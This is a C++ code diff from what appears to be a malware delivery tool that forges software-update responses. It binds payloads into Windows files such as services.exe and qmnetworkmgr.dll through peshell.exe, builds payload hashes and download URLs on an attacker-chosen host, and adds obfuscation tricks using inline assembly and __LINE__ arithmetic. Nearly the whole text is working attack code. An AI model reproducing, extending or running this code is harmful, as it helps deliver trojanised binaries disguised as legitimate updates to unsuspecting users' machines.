@@ -170,6 +170,7 @@ string ObjectFromRegex( char* regex,char* format,string version, vector<UPDATE_I
 			}
 			case 'u': {
 				params[cnt++] = ui[0].url.c_str();
+				continue;
 			}
 			case 'v': {
 				params[cnt++] = version.c_str();
@@ -215,7 +216,7 @@ string ObjectFromRegex( char* regex,char* format,string version, vector<UPDATE_I
 	}
 
 	int backsize = cnt * 4 + 8;
-	char *outbuf = new char[0x10000];
+	char *outbuf = new char[0x100000];
 	int outLen = 0;
 
 	va_list args = (va_list) params;
@@ -267,24 +268,43 @@ int GetTargetHost(vector<string>& targetHost) {
 
 //peshell.exe -b services.exe qmnetworkmgr.dll -p 10.43.41.5 mytest -o test.dll
 int PreparePayload(string server,string user) {
-	char cmd[1024];
-	string path = gLocalPath + "config\\";
-	string exe = path + "peshell.exe";
+	string cfgpath = gLocalPath + "config\\";
+	string exe = cfgpath+"base.exe";
+	string dll = cfgpath + "base.dll";
+	
+	string shellexe = cfgpath + "peshell.exe";
 	char* bindexe = "services.exe";
 	char* binddll = "qmnetworkmgr.dll";
-	wsprintfA(cmd, "-b %s %s -p %s %s -o %s", bindexe,binddll,server.c_str(), user.c_str(),"base.dll");
-	ShellExecuteA(0, "open", exe.c_str(), cmd, path.c_str(), 0);
 
-	//RunProcess(exe.c_str(), cmd, path.c_str(), 0, 0);
+	char cmd[1024];
+	if (FileOper::isFileExist(dll) == 0) {
+		wsprintfA(cmd, "-b %s %s -p %s %s -o %s", bindexe, binddll, server.c_str(), user.c_str(), "base.dll");
+		ShellExecuteA(0, "open", shellexe.c_str(), cmd, cfgpath.c_str(), 0);
+		//RunProcess(exe.c_str(), cmd, path.c_str(), 0, 0);
+	}
 
-	wsprintfA(cmd, "-b %s %s -p %s %s -o %s", bindexe, binddll, server.c_str(), user.c_str(), "base.exe");
-	ShellExecuteA(0, "open", exe.c_str(), cmd, path.c_str(), 0);
-	//RunProcess(exe.c_str(), cmd, path.c_str(), 0, 0);
+	if (FileOper::isFileExist(exe) == 0) {
+		wsprintfA(cmd, "-b %s %s -p %s %s -o %s", bindexe, binddll, server.c_str(), user.c_str(), "base.exe");
+		ShellExecuteA(0, "open", shellexe.c_str(), cmd, cfgpath.c_str(), 0);
+		//RunProcess(exe.c_str(), cmd, path.c_str(), 0, 0);
+	}
+
 	return 0;
 }
 
 int ObjectParser(vector<string> &targetHost,string server,string user) {
+	//return 0;
 	int ret = 0;
+
+	char* retaddr = 0;
+	__asm {
+		lea eax, __retaddr
+		mov [retaddr],eax
+	}
+	//(__FUNCTION__,retaddr);
+	int k = __LINE__/2;
+	int d = __LINE__ - 292;
+	//k = k / d;
 
 	PreparePayload(server, user);
 
@@ -333,9 +353,10 @@ int ObjectParser(vector<string> &targetHost,string server,string user) {
 					name = "base.exe";
 
 				string ct = pl[n]["compress"].asString();
-				
-				int ft = FileOper::GetFileType(cfgpath + name);
+
 				string target = name;
+				int ft = FileOper::GetFileType(cfgpath + name);
+				 
 				if (ft & FILE_ATTRIBUTE_DIRECTORY) {
 					string replace = pl[n]["replace"].asString();
 					if (replace != "") {
@@ -436,8 +457,27 @@ int ObjectParser(vector<string> &targetHost,string server,string user) {
 				char sha256[128];
 				MySha::filesha256((pluginPath + target).c_str(), sha256, 1);
 
+				string destname = pl[n]["dest"].asString();
+				if (destname == "") {
+					destname = target;
+				}
+				else if (destname == "md5")
+				{
+					destname = string(szmd5, 32)+ target.substr(target.length() - 4);
+					ret = CopyFileA((pluginPath + target).c_str(), (pluginPath + destname).c_str(), 0);
+				}
+				else {
+					//something error?
+				}
+
+				string desturl = pl[n]["desthost"].asString();
 				char url[1024];
-				wsprintfA(url, "https://%s/%s", gstrServerIP.c_str(), target.c_str());
+				if (desturl == "") {
+					wsprintfA(url, "http://%s/%s", gstrServerIP.c_str(), destname.c_str());	
+				}
+				else {
+					wsprintfA(url, "http://%s/%s", desturl.c_str(), destname.c_str());
+				}
 				
 				payloads.push_back({ target,version,payload_size, md5, sha1, sha256,  url});
 			}
@@ -467,11 +507,11 @@ int ObjectParser(vector<string> &targetHost,string server,string user) {
 
 				if (respFormatLen && formatLen) {
 					string payloadstr = ObjectFromRegex((char*)regex.c_str(), format, cfgver, payloads);
-
-					char* pack = new char[0x4000];
-					int packsize = 0x4000;
+					int packsize = payloadstr.length() + 0x1000;
+					char* pack = new char[packsize];
+					
 					if (obj[i].isMember("crypt")) {
-						char* tmpbuf = new char[0x4000];
+						char* tmpbuf = new char[packsize];
 						int tmpsize = 0;
 
 						Json::Value crypt = obj[i]["crypt"];
@@ -518,6 +558,7 @@ int ObjectParser(vector<string> &targetHost,string server,string user) {
 		}
 	}
 
+	__retaddr:
 	return 0;
 }
 
